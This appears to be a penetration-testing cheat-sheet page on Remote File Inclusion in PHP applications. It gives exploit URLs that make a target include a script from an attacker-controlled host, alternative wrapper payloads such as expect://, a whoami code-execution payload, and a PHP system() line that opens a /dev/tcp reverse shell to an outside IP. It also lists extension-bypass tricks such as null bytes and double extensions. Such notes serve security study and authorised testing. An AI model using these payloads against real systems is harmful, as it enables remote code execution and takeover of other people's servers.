---
description: >-
  A remote file inclusion vulnerability allows an attacker to remotely execute a
  script on the victim even if it is not available locally.
---

# Remote File Inclusion (RFI)

### Examples

#### Testing for RFI

Quick test for RFI with a PHP file, name this test.php and host using a Python server:

```php
<?php
echo "Hello";
?>
```

If we see the tags then we do not have remote code execution, however, if it says "Hello" then we have code execution.&#x20;

#### Basic Exploitation

`http://localhost/index.php?page=http://someevilhost.com/test.php`

If RFI doesn't work due to the HTTP wrapper being disabled then we can also try the following wrappers:

`ftp://10.10.10.1/AnyFile`

`expect://ls`

#### Obtaining a Shell

The simplest way to obtain a shell is to make a callback to the attacker server:

`http://acme.com/index.php?page=http://attackerserver.com/evil.txt`\
\
This vulnerability can be easily exploited by either using a PHP shell available from `/usr/share/webshells/php`&#x20;

Alternatively, the following commands can be input to a .txt file to obtain code execution:

`<?php echo shell_exec("whoami");?>`

`<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>`

### Notes

As stated briefly in the [LFI section](local-file-inclusion-lfi.md#additional-notes)

It is important in some situations to add a nullbyte `%00` to avoid appending `.php` or another extension like `.config`

If this does not work you can also add a `?`, to ensure that the rest will be interpreted as URL parameters.

A dirty way of bypassing this is also to name your file with the extension, e.g., `evil.txt.php`
